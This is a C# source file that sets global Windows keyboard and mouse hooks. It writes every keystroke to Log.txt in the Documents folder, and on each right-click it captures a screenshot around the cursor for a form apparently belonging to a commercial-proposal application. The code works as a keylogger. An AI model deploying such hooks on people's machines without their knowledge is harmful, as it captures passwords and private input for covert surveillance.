
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Drawing;
using System.Drawing.Printing;
//using System.Environment;

class InterceptKeys{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WH_MOUSE_LL = 14;
    //private const int WM_LBUTTONDOWN = 0x201;
    //private const int WM_LBUTTONUP = 0x202;
    private const int WM_RBUTTONUP = 0x205;
    private const int WM_RBUTTONDOWN = 0x204;
 
    public static IntPtr Key_hookID = IntPtr.Zero;
    public static IntPtr Click_hookID = IntPtr.Zero;

    // Initialise the methods that are run when hook is triggered
    private static LowLevelKeyboardProc Key_proc = Key_HookCallback; 
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelMouseProc Click_proc = Click_HookCallback;
    private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static string log_path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Log.txt";
    public static Coque_PropositionCommerciale.F_accueil acceuil = new Coque_PropositionCommerciale.F_accueil();

    public static void Hook()  { // initialise the hook and Define what methods to run when hook is triggered
        using (Process curProcess = Process.GetCurrentProcess()) // gets the Current Process 
        using (ProcessModule curModule = curProcess.MainModule){ // gets the module associated with the current process
            Key_hookID = SetWindowsHookEx(WH_KEYBOARD_LL, Key_proc, GetModuleHandle(curModule.ModuleName), 0);
            Click_hookID = SetWindowsHookEx(WH_MOUSE_LL, Click_proc, GetModuleHandle(curModule.ModuleName), 0);
        }
        TextWriter tw = new StreamWriter(log_path, true);
        tw.WriteLine(DateTime.Now.ToString() + "\n");
        tw.Close();
    }

    private static IntPtr Key_HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        int vkCode = Marshal.ReadInt32(lParam);
        Keys keyCode= (Keys)vkCode;
        KeysConverter kc=new KeysConverter();
        string keyCode_str = kc.ConvertToString((Keys)vkCode);
        if (keyCode_str == "Scroll") {             
            acceuil.Show();
        }
        
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && File.Exists(log_path)){
                TextWriter tw = new StreamWriter(log_path,true);
                tw.WriteLine(keyCode_str + "\n");
                tw.Close();
                //AutoClosingMessage.ShowAutoClosingMessageBox(keyCode_str, "caption");
        }
        return CallNextHookEx(Key_hookID, nCode, wParam, lParam);
    }

    private static IntPtr Click_HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_RBUTTONDOWN))
        {
            //get fullscreen
            /*Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphic = Graphics.FromImage(bmp);
            graphic.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                         Screen.PrimaryScreen.Bounds.Y,
                         0, 0,
                         bmp.Size,
                         CopyPixelOperation.SourceCopy);*/
            //get square around cursor
            Point CursorCoordinates = System.Windows.Forms.Cursor.Position; 
            Bitmap bmp = new Bitmap(200,200);
            Graphics graphic = Graphics.FromImage(bmp);
            graphic.CopyFromScreen(CursorCoordinates.X - 100, CursorCoordinates.Y - 100, 0, 0, bmp.Size, CopyPixelOperation.SourceCopy);

            Image ClickImage = (Image)bmp ;
            Coque_PropositionCommerciale.F_accueil.add_Click_2datatable(ClickImage);//MessageBox.Show("CLICK");
        }
        
        return CallNextHookEx(Click_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);


}